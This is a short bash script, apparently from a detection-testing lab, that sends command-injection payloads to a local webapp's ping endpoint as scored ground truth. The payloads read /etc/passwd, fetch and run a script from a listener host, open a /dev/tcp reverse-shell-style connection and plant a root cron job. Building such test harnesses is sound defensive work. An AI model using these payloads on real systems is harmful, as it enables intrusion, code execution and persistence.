#!/bin/bash
# Synthetic attack through the command injection in webapp.py. Runs only inside the
# disposable sensor container and talks only to the lab listener container.
# Each payload ends with the shell comment "#lab-attack". It is ground truth for scoring
# and is never read by a detection (see docs/DESIGN_NOTES.md).
inject() {
  curl -s -m 10 -o /dev/null -G "http://127.0.0.1:8080/ping" --data-urlencode "host=127.0.0.1;$1 #lab-attack"
  sleep 1
}
inject "id; whoami; uname -a; hostname"                                   # T1033, T1082 discovery
inject "cat /etc/passwd"                                                   # T1087.001 account discovery
inject "curl -s -m 3 -o /tmp/.x http://listener:8000/stage1.sh; sh /tmp/.x"  # T1105 then T1059.004
inject "bash -c 'exec 3<>/dev/tcp/listener/4444; echo hello-from-lab >&3'"   # T1059.004 reverse shell shape
inject "echo '* * * * * root true' > /etc/cron.d/lab-job"                  # T1053.003 cron persistence
